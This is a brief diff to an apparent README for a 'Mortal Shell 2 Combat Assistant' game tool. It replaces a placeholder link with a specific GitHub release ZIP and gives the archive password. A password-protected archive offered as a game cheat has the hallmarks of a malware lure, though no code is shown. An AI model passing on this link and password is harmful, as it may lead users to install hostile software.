@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Mortal-Shell-2-Combat-Assistant/releases/latest/download/MortalShell2-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/anton-b-1905m2/Mortal-Shell-2-Combat-Assistant/releases/download/download/MortalShell2_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
